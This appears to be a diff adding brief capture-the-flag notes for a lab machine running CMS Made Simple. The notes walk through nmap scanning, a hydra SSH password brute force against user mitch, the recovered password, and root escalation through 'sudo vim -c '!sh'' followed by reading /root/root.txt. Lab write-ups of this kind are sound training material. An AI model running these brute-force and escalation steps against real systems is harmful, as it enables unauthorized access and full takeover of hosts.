@@ -1,0 +1,38 @@
+nmap -sS ip
+21/tcp   open  ftp
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+
+#port 2222 running the ssh 
+
+nmap -A ip
+
+#here find the path /simple
+#they using the cms simple webapp
+
+#google search for "cms simple exploit" and cve
+CVE-2019-9053
+
+http://ip/simple
+#look for all the page 
+http://ip/simple/index.php?page=how-cmsms-works
+#i got username: mitch in the above link 
+#and  i bruteforced the ssh login using hydra and passwordlist they given in hint
+hydra -l mitch -P best101.txt <ip> -t 20  ssh -s 2222
+#username:mitch
+#password:secret
+ssh mitch@ip -p 2222
+#got the login
+#search for other user 
+ls /home
+mitch,sunbath
+
+#prisec
+sudo -l
+#here vim run as root without password so 
+sudo vim -c '!sh'
+#now you got the root shell
+id 
+#to confirm it
+cat /root/root.txt
